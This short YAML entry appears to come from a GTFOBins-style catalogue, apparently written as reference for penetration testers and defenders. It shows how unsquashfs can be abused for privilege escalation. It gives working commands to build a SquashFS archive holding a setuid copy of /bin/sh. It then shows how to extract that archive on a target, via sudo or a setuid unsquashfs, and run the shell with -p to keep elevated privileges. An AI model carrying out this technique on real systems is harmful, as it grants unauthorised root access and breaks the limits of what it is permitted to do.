---
description: |
  `unsquashfs`, the utility used to extract the contents of SquashFS file systems, preserves the permissions and ownership information of files and directories. This includes the suid (set user ID) and sgid (set group ID) bits, which can be set on executable files to allow them to be run with the privileges of the file owner or group owner, respectively. Prepare an archive beforehand with the following commands as root:

  ```
  cp /bin/sh .
  chmod +s sh
  mksquashfs sh x.sqfs
  ```

  Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).
functions:
  sudo:
    - code: |
        sudo unsquashfs ./x.sqfs
        ./squashfs-root/sh -p
  suid:
    - code: |
        unsquashfs ./x.sqfs
        ./squashfs-root/sh -p
---
